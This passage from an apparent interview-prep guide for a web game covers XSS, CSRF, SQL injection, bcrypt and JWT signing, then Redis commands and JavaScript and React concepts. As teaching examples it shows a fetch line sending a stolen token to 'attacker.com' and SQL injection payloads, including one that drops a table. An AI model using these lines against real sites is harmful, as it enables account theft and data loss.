**What happens when all 10 are busy:**
New queries wait in a queue until a connection is freed. If no connection becomes available within `connectionTimeoutMillis` (5000ms), the query throws an error.

---

# PART 5 — SECURITY DEEP DIVE

---

## 5.1 — "What is XSS? How could it affect your JWT in localStorage?"

**XSS (Cross-Site Scripting):** An attacker injects malicious JavaScript into a page that other users load. If your app renders user-provided content without sanitization (e.g., a username displayed as raw HTML), an attacker could store `<script>alert(document.cookie)</script>` as their username. When other users visit the leaderboard, the script runs in their browser context.

**Why localStorage JWTs are vulnerable:**
Any JavaScript running on your page can read `localStorage`:
```js
const token = localStorage.getItem('rg_auth_token'); // any JS can do this
fetch('https://attacker.com/steal?token=' + token);
```
An XSS attack that gets JS running on your page can steal the token and impersonate the user indefinitely (until the 7-day expiry).

**The httpOnly cookie solution:**
An `httpOnly` cookie cannot be accessed by JavaScript at all — it's only sent by the browser in HTTP requests. An XSS attack cannot read it. This is why production auth systems use httpOnly cookies for refresh tokens.

**Your current risk level:** Low. The leaderboard displays only usernames (which are validated server-side: `/^[a-zA-Z0-9_]{3,20}$/`). No raw HTML rendering of user content. XSS is unlikely in the current feature set. But it's a known theoretical risk worth stating.

---

## 5.2 — "What is CSRF? Is your app vulnerable?"

**CSRF (Cross-Site Request Forgery):** A malicious site tricks a logged-in user's browser into making a request to your API. The browser automatically sends cookies with every request — so if your auth is cookie-based, a `<form action="https://radioguessr.space/api/leaderboard" method="POST">` on an attacker's site would submit a score with the user's cookie.

**Your app is NOT vulnerable to CSRF** because:
1. You use JWTs in the `Authorization: Bearer` header, not cookies. Headers are never automatically sent by the browser — only JavaScript can set them. A CSRF attack (which exploits automatic cookie sending) cannot set the `Authorization` header.
2. Your CORS allowlist prevents cross-origin requests from getting responses even if they're sent.

CSRF is a cookie problem. Your JWT-in-header approach sidesteps it entirely. The tradeoff is XSS vulnerability (covered above).

---

## 5.3 — "What is SQL injection? Show me a vulnerable version of your query."

**Vulnerable version:**
```js
// NEVER DO THIS
const result = await query(
  `SELECT id, username, password FROM users WHERE email = '${email}'`
);
```
If `email` is `' OR '1'='1`, the query becomes:
```sql
SELECT id, username, password FROM users WHERE email = '' OR '1'='1'
```
This returns all users. Attacker is now logged in as the first user in the database.

If `email` is `'; DROP TABLE users; --`, the query becomes:
```sql
SELECT id, username, password FROM users WHERE email = ''; DROP TABLE users; --'
```
The users table is deleted.

**Your safe version:**
```js
const result = await query(
  'SELECT id, username, password FROM users WHERE email = $1',
  [email]
);
```
The `pg` library sends the query string and parameters separately to Postgres. The database treats `$1` as a typed placeholder, not as SQL. Whatever is in `email` is interpreted as a string value, never as SQL syntax. Even `'; DROP TABLE users; --` is just a string that doesn't match any email — no injection possible.

---

## 5.4 — "What is a rainbow table? How does bcrypt's salt prevent it?"

**Rainbow table:** A precomputed table of `hash → plaintext` mappings. If you hash all common passwords with MD5 or SHA-256, you get a lookup table. Given a stolen hash, find the plaintext in O(1).

**Unsalted hashing is vulnerable:**
```
MD5("password123") = "482c811da5d5b4bc6d497ffa98491e38"
```
This hash is in every rainbow table. An attacker with your database can crack weak passwords instantly.

**bcrypt's salt:**
bcrypt generates a random 16-byte salt for each password and embeds it in the hash:
```
$2b$10$N9qo8uLOickgx2ZMRZoMyeIjZAgcfl7p92ldGxad68LJZdL17lhhG
│   │  │                │
│   │  └── salt (22 chars, base64)
│   └── cost factor (10)
└── version (2b)
```

`bcrypt("password123", salt_A)` ≠ `bcrypt("password123", salt_B)`

Even if two users have the same password, their hashes are completely different because each has a unique salt. A rainbow table precomputed without the salt is useless — the attacker would need to compute a rainbow table for every possible salt, which is computationally infeasible.

**Cost factor:** The `10` in `bcrypt(password, 10)` means the hash function is applied 2^10 = 1024 times. This makes each hash computation take ~100ms. Brute-forcing 1 million password guesses would take 100,000 seconds (28 hours) on one machine. With a salt, even GPU clusters can't precompute rainbow tables.

---

## 5.5 — "What does HMAC-SHA256 do in JWT signing?"

**SHA-256** is a cryptographic hash function. Input → 256-bit output. One-way: you can't reverse it. Deterministic: same input always gives same output. Collision-resistant: finding two inputs with the same output is computationally infeasible.

**HMAC (Hash-based Message Authentication Code):** A way to use a hash function with a secret key for authentication.

```
HMAC-SHA256(key, message) = SHA256(key XOR opad || SHA256(key XOR ipad || message))
```

The key is mixed into the hash in a way that makes it impossible to compute the HMAC without knowing the key.

**In JWT:**
```
header  = base64url({"alg":"HS256","typ":"JWT"})
payload = base64url({"sub":"user-uuid","username":"alice","exp":1234567890})
signature = HMAC-SHA256(JWT_SECRET, header + "." + payload)
token = header + "." + payload + "." + base64url(signature)
```

**Verification:** Take the received header and payload, recompute `HMAC-SHA256(JWT_SECRET, header + "." + payload)`, compare with the received signature. If they match, the token was created by someone who knows `JWT_SECRET` (only your server) and hasn't been tampered with (changing any bit of header or payload changes the signature).

**Why an attacker can't forge a token:**
Without `JWT_SECRET`, they can't compute a valid signature. The header and payload are base64-encoded (not encrypted!) — anyone can read the payload contents. JWTs are about integrity (hasn't been tampered with) and authenticity (came from the right server), not confidentiality (keeping contents secret). Never put sensitive data in a JWT payload unless it's encrypted (JWE).

---

# PART 6 — REDIS COMMANDS REFERENCE

---

## 6.1 — String Commands (what your cache uses)

```bash
# SET a key with value
SET key value

# SET with expiry (EX = seconds, PX = milliseconds)
SET rg:cache:DE:votes:true:40:jazz '["station1","station2"]' EX 600

# GET a key (returns nil if missing or expired)
GET rg:cache:DE:votes:true:40:jazz

# DELETE one or more keys
DEL rg:cache:DE:votes:true:40:jazz

# Check if a key exists (returns 1 or 0)
EXISTS rg:cache:DE:votes:true:40:jazz

# Get remaining TTL in seconds (-1 = no expiry, -2 = key doesn't exist)
TTL rg:cache:DE:votes:true:40:jazz

# Set expiry on existing key
EXPIRE rg:cache:DE:votes:true:40:jazz 600

# Remove expiry (make key permanent)
PERSIST rg:cache:DE:votes:true:40:jazz

# Atomic increment (useful for counters, rate limiting)
INCR page:views           # increments by 1, returns new value
INCRBY page:views 5       # increments by 5

# Set only if key does NOT exist (NX = Not eXists)
# Used for distributed locks
SET lock:resource "locked" EX 30 NX
```

---

## 6.2 — Key Pattern Commands

```bash
# Find all keys matching a pattern (DANGEROUS in production — O(N))
KEYS rg:cache:*            # returns all cache keys
KEYS rg:*                  # returns all radioguessr keys

# WHY KEYS IS DANGEROUS:
# Redis is single-threaded. KEYS scans every key in the database.
# On a database with 10 million keys, KEYS blocks Redis for seconds.
# All other clients wait. In production this can cause cascading failures.

# The safe alternative: SCAN (cursor-based, incremental)
SCAN 0 MATCH rg:cache:* COUNT 100
# Returns: [next_cursor, [matching_keys]]
# Repeat with next_cursor until cursor = 0 (full scan complete)
# Each call processes ~100 keys, doesn't block Redis

# Count all keys in the database
DBSIZE

# Delete all keys (DANGEROUS — use only in dev/test)
FLUSHDB    # delete all keys in current database
FLUSHALL   # delete all keys in all databases
```

---

## 6.3 — Sorted Set Commands (for leaderboard or rate limiting)

A sorted set stores members with an associated score. Members are unique; scores can repeat. The set is always sorted by score.

```bash
# Add a member with a score
ZADD leaderboard 24800 "alice"
ZADD leaderboard 23500 "bob"
ZADD leaderboard 21000 "charlie"

# Get top N members (highest score first)
ZRANGE leaderboard 0 9 REV WITHSCORES
# Returns: ["alice", "24800", "bob", "23500", ...]

# Get rank of a member (0-indexed, lowest score = rank 0)
ZRANK leaderboard "alice"        # returns 2 (lowest rank)
ZREVRANK leaderboard "alice"     # returns 0 (highest rank = #1)

# Count members with score between min and max
ZCOUNT leaderboard 20000 25000

# Remove a member
ZREM leaderboard "alice"

# SLIDING WINDOW RATE LIMITER using sorted set:
# Key: ratelimit:<ip>, Score: timestamp, Member: unique-id (e.g. timestamp+random)
ZADD ratelimit:1.2.3.4 1700000100 "req1"
ZADD ratelimit:1.2.3.4 1700000110 "req2"

# Remove timestamps older than window
ZREMRANGEBYSCORE ratelimit:1.2.3.4 0 (windowStart)

# Count requests in window
ZCOUNT ratelimit:1.2.3.4 windowStart +inf

# Set TTL so abandoned IPs are cleaned up
EXPIRE ratelimit:1.2.3.4 900   # 15 minute window
```

---

## 6.4 — Hash Commands (for storing structured objects)

A Redis Hash is a map of field → value, stored under one key. Better than storing a JSON string when you need to read/update individual fields.

```bash
# Set fields in a hash
HSET user:uuid-123 username "alice" email "alice@ex.com" games_played 5

# Get one field
HGET user:uuid-123 username          # "alice"

# Get all fields and values
HGETALL user:uuid-123

# Increment a numeric field atomically
HINCRBY user:uuid-123 games_played 1

# Check if field exists
HEXISTS user:uuid-123 email          # 1

# Delete a field
HDEL user:uuid-123 email
```

---

## 6.5 — List Commands (for queues)

```bash
# Push to left (head) of list
LPUSH queue:emails "email1" "email2"

# Push to right (tail) of list
RPUSH queue:emails "email3"

# Pop from left (dequeue — FIFO with RPUSH + LPOP)
LPOP queue:emails

# Blocking pop (wait up to 30s for an item)
BLPOP queue:emails 30

# Get range of elements
LRANGE queue:emails 0 -1    # all elements
LRANGE queue:emails 0 9     # first 10

# Length
LLEN queue:emails
```

---

## 6.6 — Set Commands (unique values, no order)

```bash
# Add members
SADD seen:stations uuid1 uuid2 uuid3

# Check membership — O(1)
SISMEMBER seen:stations uuid1       # 1 (yes) or 0 (no)

# All members
SMEMBERS seen:stations

# Count members
SCARD seen:stations

# Remove a member
SREM seen:stations uuid1

# Set operations
SUNION set1 set2      # union
SINTER set1 set2      # intersection
SDIFF set1 set2       # members in set1 not in set2
```

---

## 6.7 — Redis Persistence: RDB vs AOF

**RDB (Redis Database Backup):**
Periodic snapshots of the entire dataset written to disk. Configured as "save every N seconds if M keys changed":
```
save 900 1    # after 900s if at least 1 key changed
save 300 10   # after 300s if at least 10 keys changed
```
**Pros:** Fast restarts, compact file, low overhead during normal operation.
**Cons:** Potential data loss between snapshots — if Redis crashes at T+299s, you lose 299s of data.

**AOF (Append-Only File):**
Every write command is appended to a log file. On restart, Redis replays the log to reconstruct state.
**Pros:** Near-zero data loss (can fsync every second or every command).
**Cons:** AOF file grows over time (compacted periodically with `BGREWRITEAOF`), slightly slower writes.

**For your cache:**
Cache data is not critical — a miss just fetches from Radio Browser. Upstash handles persistence for you. You don't need to configure this, but you should know it exists for interviews.

---

## 6.8 — Redis Pub/Sub (for multiplayer or real-time features)

Pub/Sub is a messaging pattern: publishers send messages to a channel; all subscribers to that channel receive them.

```bash
# Subscribe to a channel (blocks, waiting for messages)
SUBSCRIBE game:room:abc123

# Publish a message
PUBLISH game:room:abc123 '{"event":"opponent_submitted","score":4200}'
```

**How this enables multiplayer with multiple server instances:**
- Player A connects to Express Instance 1. Their WebSocket is handled by Instance 1.
- Player B connects to Express Instance 2. Their WebSocket is handled by Instance 2.
- Player A submits a guess. Instance 1 `PUBLISH`es to `game:room:xyz`.
- Instance 2 is `SUBSCRIBE`d to `game:room:xyz`. It receives the message and pushes it to Player B's WebSocket.

Without Redis pub/sub, Instance 2 would have no way to know Player A submitted — they're on different processes. This is why Redis is central to real-time multiplayer architecture.

---

## 6.9 — Redis Data Types Summary

| Type | Structure | Main Use Case | Key Commands |
|---|---|---|---|
| String | Single value | Cache, counters, session tokens | GET, SET, INCR, EXPIRE |
| Hash | Map of fields | Structured objects (user profiles) | HGET, HSET, HINCRBY |
| List | Ordered, duplicates OK | Queues, activity feeds | LPUSH, RPOP, BLPOP |
| Set | Unordered, unique | Tags, unique visitors, seen IDs | SADD, SISMEMBER, SINTER |
| Sorted Set | Unique + score-ordered | Leaderboards, rate limiting | ZADD, ZRANGE, ZCOUNT |
| Stream | Append-only log | Event sourcing, message queues | XADD, XREAD |
| Bitmap | Bit array | Daily active users, feature flags | SETBIT, GETBIT, BITCOUNT |

---

# PART 7 — JAVASCRIPT LANGUAGE QUESTIONS

---

## 7.1 — "What is the difference between == and === in JavaScript?"

`==` (abstract equality): coerces types before comparison.
```js
0 == false    // true (false coerced to 0)
"" == false   // true
null == undefined // true
```

`===` (strict equality): no type coercion. Types must match.
```js
0 === false   // false (different types)
null === undefined // false
```

**Always use `===` in production code.** Type coercion creates subtle bugs. In your server code, `if (timestamps.length >= max)` uses `>=` with numbers — no coercion issue. But `if (key == null)` would be true for both `null` and `undefined`, which might be intentional. Always be explicit: `if (key === null || key === undefined)` or `if (key == null)` only when you explicitly want both.

---

## 7.2 — "What is the difference between var, let, and const?"

**var:**
- Function-scoped (not block-scoped). Accessible outside `if`/`for` blocks.
- Hoisted: the declaration is moved to the top of the function, initialized to `undefined`.
- Can be redeclared in the same scope.
- Avoid in modern code.

**let:**
- Block-scoped. Only accessible within `{}` where declared.
- Hoisted but not initialized (Temporal Dead Zone — accessing before declaration throws ReferenceError).
- Cannot be redeclared in the same scope.

**const:**
- Same as `let` but the binding cannot be reassigned.
- The value itself can mutate: `const arr = []; arr.push(1)` — allowed. `arr = []` — not allowed.

**In your codebase:** `const` for all stable references (stores, routers, configs). `let` only when a variable needs to be reassigned (loop variables, conditionally assigned values). No `var`.

---

## 7.3 — "What is closure? Give me an example from your code."

A closure is a function that captures variables from its enclosing scope — even after the enclosing function has returned.

**Your rate limiter factory:**
```js
function createRateLimiter(windowMs, max, label) {
  const store = new Map();   // ← captured by the closure

  return function rateLimit(req, res, next) {
    // This function closes over: store, windowMs, max, label
    // Even after createRateLimiter() returns, these variables live on
    // because the returned function holds a reference to them.
    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
    if (!store.has(ip)) store.set(ip, []);
    // ...
  };
}

const loginLimiter = createRateLimiter(900_000, 5, 'login');
// loginLimiter is a closure. It has its own private `store` Map.

const stationLimiter = createRateLimiter(60_000, 60, 'station');
// stationLimiter has a DIFFERENT private `store` Map.
```

Each call to `createRateLimiter` creates a new closure with its own `store`. This is why the login and station rate limits are completely independent — different Map instances captured by different closures.

---

## 7.4 — "What is event delegation? How does Globe.jsx use it?"

Event delegation: instead of attaching event listeners to many individual elements, attach one listener to a parent and check `event.target` to determine which child was clicked.

In Globe.jsx, Globe.gl attaches one event listener to the canvas element and reports `{ lat, lng }` of the click point — not "which country was clicked" but the raw 3D coordinates. The application then does math to determine what those coordinates correspond to. This is event delegation at the canvas level: one listener on the canvas handles all globe clicks, regardless of what the user clicked on.

---

## 7.5 — "What is the difference between null and undefined?"

**undefined:** A variable has been declared but not assigned a value. Also the return value of functions that don't explicitly return.
```js
let x;         // x is undefined
function f() {} // f() returns undefined
obj.missingProp // undefined
```

**null:** An explicit assignment meaning "intentionally no value."
```js
let station = null;  // we know a station should exist, but it doesn't yet
```

**In your code:** `prefetchedStation: null` — explicitly saying "no prefetched station." `const prefetched = get().prefetchedStation;` — if it's null, use `fetchStation()`. If it were `undefined`, it would mean the field doesn't exist — different semantic.

---

# PART 8 — REACT & FRONTEND INTERNALS

---

## 8.1 — "What is the React virtual DOM? How does reconciliation work?"

**Virtual DOM:** React maintains a lightweight JavaScript object tree that mirrors the actual DOM. When state changes, React builds a new virtual DOM tree and compares it with the previous one (diffing).

**Reconciliation (the diffing algorithm):**
1. React compares old and new virtual DOM trees node by node.
2. If a node type changes (e.g., `<div>` → `<span>`), tear down the old subtree and build a new one.
3. If the node type is the same, update only the changed attributes/children.
4. Lists use `key` props to identify which items changed, added, or removed without re-rendering everything.

**Why it matters for your game:**
When `phase` changes from `'playing'` to `'result'`, React unmounts `<PlayingScreen>` and mounts `<ResultScreen>`. Framer Motion's `AnimatePresence` hooks into this unmount lifecycle to run exit animations before the component is removed from the DOM.

**Zustand's role:** Zustand's selector-based subscriptions mean only components that subscribe to a specific state slice re-render when that slice changes. `<ResultScreen>` subscribes to `result`, `score`, etc. It doesn't re-render when `prefetchedStation` changes in the background — because it doesn't select that field.

---

## 8.2 — "What is the difference between useEffect and useLayoutEffect?"

Both run after render. The difference is timing:

**useEffect:** Runs asynchronously after the browser has painted. The user sees the rendered output first. Most side effects (data fetching, subscriptions, timers) belong here.

**useLayoutEffect:** Runs synchronously after DOM mutations but before the browser paints. Use for measuring DOM elements or making DOM changes that must happen before the user sees anything (prevents flicker).

**In your project:** If Globe.jsx reads the canvas dimensions after mount to initialize the globe, it should use `useLayoutEffect` — reading layout after paint could cause a brief flash if the globe initializes with wrong dimensions. General data fetching uses `useEffect`.

---

## 8.3 — "What is the key prop in React lists? Why does it matter?"

When rendering a list, React uses the `key` prop to identify which items changed between renders.

```jsx
{history.map((item, index) => (
  <div key={index}>  {/* using index as key */}
    ...
  </div>
))}
```

**Problem with index as key:** If the list order changes (or an item is inserted at the beginning), React sees the same keys but different content — it updates the DOM incorrectly and can cause state bugs (like an input keeping its old value after its item moved).

**Better: use a stable unique ID:**
```jsx
{history.map((item) => (
  <div key={item.stationuuid}>
    ...
  </div>
))}
```

**In your FinalScreen:** `history.map((item, index) => ... key={index})` — using index is acceptable here because the history array never reorders. Items are only appended. In this specific case, index keys are safe.

---

# PART 9 — QUICK-FIRE CONCEPTS

---

## 9.1 — What is idempotency?

An operation is idempotent if calling it multiple times produces the same result as calling it once.

- `GET /api/leaderboard` — idempotent. Call it 100 times, same result.
- `POST /api/leaderboard` — NOT idempotent. Call it 3 times, you get 3 game sessions saved.
- `DELETE /api/session/abc` — idempotent. Delete once or 10 times — the session is gone either way.

**Why it matters:** If a network request times out, should the client retry? For GET and DELETE, yes — they're idempotent. For POST, retrying could create duplicate data. Solutions: idempotency keys (client sends a unique request ID; server deduplicates), or make the endpoint idempotent (e.g., `UPSERT` instead of `INSERT`).

---

## 9.2 — What is a race condition? Can your code have one?

A race condition occurs when the outcome depends on the timing of concurrent operations.

**Node.js single-threaded:** JavaScript itself has no race conditions — only one piece of code runs at a time. But you can have logical races with async operations:

```js
// Potential logical race in rate limiter (not actually a problem in Node):
const timestamps = store.get(ip);
// --- another request could run here in a multi-threaded env ---
if (timestamps.length >= max) return 429;
timestamps.push(now);
```

In Node.js, because there's no preemption between synchronous operations, this is fine. The check and push happen atomically from JavaScript's perspective.

**In a multi-instance Redis rate limiter:**
```
Instance 1: ZCOUNT ratelimit:ip → 4 (under limit)
Instance 2: ZCOUNT ratelimit:ip → 4 (under limit)
Instance 1: ZADD (now at 5)
Instance 2: ZADD (now at 6 — over limit, but both were allowed!)
```
This IS a race condition. Fix: use a Redis Lua script (executes atomically) or `MULTI/EXEC` transaction.

---

## 9.3 — What is debouncing vs throttling?

**Debouncing:** Wait until N milliseconds after the last call before executing. Used for search inputs — don't fire a request on every keystroke, only after the user pauses.

**Throttling:** Execute at most once per N milliseconds. Used for scroll handlers, resize events — process at a controlled rate regardless of how fast events fire.

**In your game:** Globe click events could be debounced — if a user clicks rapidly, only process the last click. The guess button is shown only after a click, which naturally prevents rapid double-submission.

---

## 9.4 — What is the difference between authentication and authorization?

**Authentication:** "Who are you?" — Verifying identity. Your `POST /api/auth/login` and JWT verification. Proves the user is who they claim to be.

**Authorization:** "What are you allowed to do?" — Verifying permissions. Currently your app has simple authorization: if you have a valid JWT, you can save scores. More complex authorization: only the user who created a record can delete it, or admins can see all users.

**In your `requireAuth` middleware:** This is authentication (verify JWT) AND a basic authorization check (only authenticated users can call this route). True role-based authorization would check `req.user.role === 'admin'` or similar.

---

## 9.5 — What is the difference between REST and GraphQL?

**REST:** Resources are endpoints. `GET /api/leaderboard` returns everything the server decides to return. Multiple resources = multiple requests.

**GraphQL:** One endpoint (`POST /graphql`). The client specifies exactly what fields it wants in the query. One request can fetch nested data across multiple resources.

**For your leaderboard:**

REST:
```
GET /api/leaderboard
→ [{ username, total_score, countries, played_at }, ...]
```

GraphQL:
```graphql
query {
  leaderboard(limit: 20) {
    username
    total_score
    # don't need countries or played_at — just don't ask for them
  }
}
```

**Why REST for your project:**
Simple, well-understood, easier to cache (GET requests are cacheable by CDNs). GraphQL adds overhead (schema definition, resolver setup) not justified for 3 endpoints. GraphQL shines when you have many entity types with complex relationships and clients with varying data needs (mobile vs web vs third-party).

---

## 9.6 — What is the CAP theorem?

In a distributed system, you can guarantee at most 2 of 3:

**Consistency:** All nodes see the same data at the same time. A read always returns the most recent write.

**Availability:** Every request receives a response (not necessarily the most recent data).

**Partition tolerance:** The system continues operating even if network partitions cause nodes to lose communication.

Since network partitions are inevitable in real distributed systems, you must choose between CP (consistent + partition-tolerant) or AP (available + partition-tolerant).

**Your systems:**
- PostgreSQL: CP — during a partition, Postgres prioritizes consistency over availability. Writes to the primary may be refused if replicas can't be confirmed.
- Redis (by default): AP — Redis clusters continue serving requests during partitions, possibly with stale data.
- Upstash: Managed — they handle this for you. Their Redis is eventually consistent across regions.

**For your project:** With a single Postgres instance (Supabase), CAP doesn't meaningfully apply — there's no distribution. It becomes relevant when you add read replicas or shard the database.

---

## NUMBERS THAT BELONG IN YOUR HEAD

| Concept | Value |
|---|---|
| L1 cache reference | ~0.5 ns |
| L2 cache reference | ~7 ns |
| RAM reference | ~100 ns |
| Redis GET (local) | ~0.1 ms |
| Redis GET (Upstash HTTP) | ~10-20 ms |
| bcrypt hash (cost 10) | ~100 ms |
| PostgreSQL simple query | ~1-5 ms |
| HTTP round trip (same city) | ~20-50 ms |
| TCP handshake (same city) | ~20 ms |
| TLS handshake (same city) | ~60-100 ms (first connection) |
| TLS resumption | ~10-20 ms |
| Radio Browser API | ~500-2000 ms |
| B-tree lookup | O(log N) |
| Hash table lookup | O(1) average |
| Leaderboard query (indexed) | O(log N + 20) |
| Leaderboard query (no index) | O(N) |
| bcrypt rounds at cost 10 | 2^10 = 1024 |
| JWT default algorithm | HS256 (HMAC-SHA256) |
| Postgres max connections (free) | 25 |
| Upstash free tier | 100k requests/day |
| Earth radius | 6,371 km |
| Half Earth circumference | 20,015 km |
